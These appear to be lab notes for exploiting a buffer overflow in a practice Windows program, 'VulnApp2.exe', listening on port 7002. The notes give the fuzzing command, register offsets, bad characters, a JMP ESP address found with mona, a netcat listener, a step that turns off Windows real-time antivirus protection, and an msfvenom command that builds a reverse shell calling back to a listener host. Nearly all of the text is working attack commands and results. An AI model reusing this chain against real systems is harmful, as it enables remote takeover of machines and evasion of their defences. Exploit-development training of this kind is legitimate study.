
Steps:
    1. Start app and find the port on which it is listening (port 7002)
        From Windows command prompt:
            `tasklist`
            `netstat -ano | find "538728"`
    2. Identify buffer overflow opportunity
        - Run `python -c "print(\"A\" * 10000)" | nc 172.29.208.1 7002`
        - Registers EBP, EIP are overriden by the buffer
        - Registers ECX, ESP appear to point to the buffer
    3. Identify offsets
        EBP is overridden by offset 2076
            `msf-pattern_offset -l 10000 -q 43327243`
        EIP is overridden by offset 2080
            `msf-pattern_offset -l 10000 -q 72433372`
        ECX points to offset 0
            `msf-pattern_offset -l 10000 -q Aa0A`
        ESP points to offset 2084
            `msf-pattern_offset -l 10000 -q 4Cr5`
        Buffer ends at 2096
            `msf-pattern_offset -l 10000 -q r7Cr`
    4. Identify bad chars "\x00\x3b\x45"
        Run `python2 test-chars.py`
    5. Find address of "JMP ESP" ("1480113d")
        Use `!mona modules` to identify "VulnApp2.exe" as the only module
            compiled without SafeSEH and ASLR
        Use 'msf-nasm_shell' to find hex code of "JMP ESP"
            `msf-nasm_shell`
            `JMP ESP`
        Run `!mona find -s "\xff\xe4" -m "VulnApp2.exe"`, which returns
            "1480113d"
        Could not find an instruction that would let us jump directly to ECX
    6. Find hex instruction for "JMP ECX"
        `msf-nasm_shell`
        `JMP ECX`
    7. Initiate shell listener
        `sudo rlwrap nc -lnvp 80`
    8. Turn off "Real-time protection" in "Virus & threat protection settings"
    9. Run exploit `python2 exploit.py`
        Reverse shell code generated by:
            msfvenom -p windows/shell_reverse_tcp LHOST=172.29.218.238 LPORT=80 -f py -b "\x00\x3b\x45"

